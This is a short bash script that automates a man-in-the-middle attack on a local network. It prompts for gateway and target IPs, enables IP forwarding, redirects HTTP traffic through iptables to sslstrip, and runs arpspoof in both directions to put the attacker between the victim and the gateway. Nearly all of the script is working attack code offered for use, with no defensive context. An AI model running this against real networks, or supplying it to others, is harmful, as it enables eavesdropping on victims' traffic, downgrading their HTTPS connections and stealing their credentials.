#!/bin/bash
# automate arpspoof, sslstrip and iptables
# Author: Ross Tramontano (RegulusAlpha)

echo "$(tput setaf 5)"
echo "      ___           ___           ___         ___           ___       "  
echo "     /  /\         /  /\         /  /\       /  /\         /__/\      "
echo "    /  /::\       /  /::\       /  /::\     /  /:/_        \  \:\     "
echo "   /  /:/\:\     /  /:/\:\     /  /:/\:\   /  /:/ /\        \__\:\    "
echo "  /  /:/~/::\   /  /:/~/:/    /  /:/~/:/  /  /:/ /::\   ___ /  /::\   "
echo " /__/:/ /:/\:\ /__/:/ /:/___ /__/:/ /:/  /__/:/ /:/\:\ /__/\  /:/\:\  "
echo " \  \:\/:/__\/ \  \:\/:::::/ \  \:\/:/   \  \:\/:/~/:/ \  \:\/:/__\/  "
echo "  \  \::/       \  \::/~~~~   \  \::/     \  \::/ /:/   \  \::/       "
echo "   \  \:\        \  \:\        \  \:\      \__\/ /:/     \  \:\       "
echo "    \  \:\        \  \:\        \  \:\       /__/:/       \  \:\      "
echo "     \__\/         \__\/         \__\/       \__\/         \__\/      "
echo "                                       v0.01                          "
echo "                                                                      "



#require root
if [ "$EUID" -ne 0 ]
    then echo "This script requires root to run."
    exit
fi

#get attack ips and interface
read -r -p "set gateway IP: " gatewayip
read -r -p "set target IP: " targetip
read -r -p "set interface: " interface

#setup ip_forward (use double wakas)

echo "1" >> /proc/sys/net/ipv4/ip_forward

#setup ssl strip and arpspoof, this uses xterm to open the required amount of terminals
xterm -e iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 -hold & xterm -e sslstrip -l 10000 & xterm -e arpspoof -i $interface -t $targetip $gatewayip & xterm -e arpspoof -i $interface -t $gatewayip $targetip



